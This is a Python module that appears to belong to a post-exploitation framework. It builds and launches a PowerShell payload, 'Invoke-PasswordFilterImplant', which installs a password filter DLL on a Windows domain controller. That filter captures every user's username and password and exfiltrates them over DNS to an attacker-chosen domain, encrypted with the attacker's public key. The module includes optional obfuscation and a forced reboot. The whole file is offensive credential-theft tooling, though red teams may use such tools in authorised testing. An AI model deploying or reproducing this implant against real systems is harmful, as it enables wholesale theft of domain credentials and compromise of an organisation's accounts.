from lib.common import helpers
import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.serialization import load_pem_public_key

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-PasswordFilterImplant',
            'Author': ['@Le-non', '@DorethZ10', '@alxbl'],
            'Description': ('Installs a password filter on a DC that exfiltrates user credentials via DNS. The data is exfiltrated in the format requestnumber.data.domain.com. The data is the string "username:password" encrypted with the given public key. Requires a DC reboot.'),
            'Background': False,
            'OutputExtension': None,
            'NeedsAdmin': True,
            'OpsecSafe': False,
            'Language': 'powershell',
            'MinLanguageVersion': '2',
        }

        self.options = {
        'Agent': {
                'Description':   'Agent to run the module on.',
                'Required'   :   True,
                'Value'      :   ''
            },
         'Key': {
                'Description'   :   'Path to the public key to use for data encryption.',
                'Required'      :   True,
                'Value'         :   ''
            },
        'Domain' : {
                'Description'   :   'DNS Domain to exfiltrate the data. MUST start with a \'.\'',
                'Required'      :   True,
                'Value'         :   '.example.com'
            },
        'DllName' : {
                'Description'   :   'File name of the password filter. (Excluding the ".dll" file extension)',
                'Required'      :   True,
                'Value'         :   'DLLPasswordFilterImplant'
            },
        'DllPath' : {
                'Description'   :   'Path to the System32 folder of the target',
                'Required'      :   True,
                'Value'         :   'C:\Windows\System32'
            },
        'RebootNow': {
                'Description'   :   'Reboot the domain controller immediately.',
                'Required'      :   True,
                'Value'         :   'False'
        },
        'Cleanup' : {
                'Description'   :   'Cleanup the trigger and any script from specified location. Note: Due to technical limitations, the dropped implant must be deleted manually after the DC has restarted.',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        self.mainMenu = mainMenu

        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):

        moduleSource = self.mainMenu.installPath + "/data/module_source/exfil/Invoke-PasswordFilterImplant.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        # Verify that the public key is valid
        key = self.options['Key']['Value']
        if key == '':
            print helpers.color("[!] Specify the path to the public key file. (e.g. pub.pem)")
            return ""
        with open(key, 'rb') as keyfile:
            pubkey = keyfile.read()
            try:
                load_pem_public_key(pubkey, default_backend())
            except:
                print helpers.color("[!] Failed to parse public key file at: " + str(key))
                return ""
            pubkey = ''.join(pubkey.strip().split('\n')[1:-1])
            print helpers.color("[*] KEY: " + str(pubkey))

        moduleCode = f.read()
        f.close()

        script = moduleCode

        # Need to actually run the module that has been loaded
        scriptEnd = 'Invoke-PasswordFilterImplant'

        # Add any arguments to the end execution of the script
        for option, values in self.options.iteritems():
            if option.lower() not in ["agent", "key"]:
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        scriptEnd += " -" + str(option)
                    else:
                        scriptEnd += " -" + str(option) + " \"" + str(values['Value']) + "\""

        scriptEnd += ' -Key "{}"'.format(pubkey)

        if obfuscate:
            scriptEnd = helpers.obfuscate(psScript=scriptEnd, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        return script

